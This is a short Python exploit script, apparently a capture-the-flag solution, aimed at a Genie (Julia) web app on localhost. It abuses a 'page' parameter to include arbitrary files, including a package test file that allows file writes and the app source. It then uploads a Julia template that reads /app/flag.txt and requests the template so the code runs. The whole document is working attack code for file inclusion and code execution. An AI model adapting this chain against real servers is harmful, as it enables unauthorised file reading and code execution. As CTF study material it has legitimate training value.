# /home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl - gives arb file write but no load
# race and reload app.jl, registered routes stay registered
# upload template and load

import requests

try:
    r = requests.get("http://127.0.0.1:1337/?page=/home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl", timeout=0.0001)
except:
    pass

# everything below this line was done after the ctf :(

r = requests.get("http://127.0.0.1:1337/?page=/app/app.jl")
print(r.text)

template = b"""
open("/app/flag.txt") do f
readline(f)
end
"""
r = requests.post("http://127.0.0.1:1337", data={'greeting': 'it worked'}, files={'fileupload': ('a', template)})
print(r.text)

r = requests.get("http://127.0.0.1:1337/?page=a")
print(r.text)
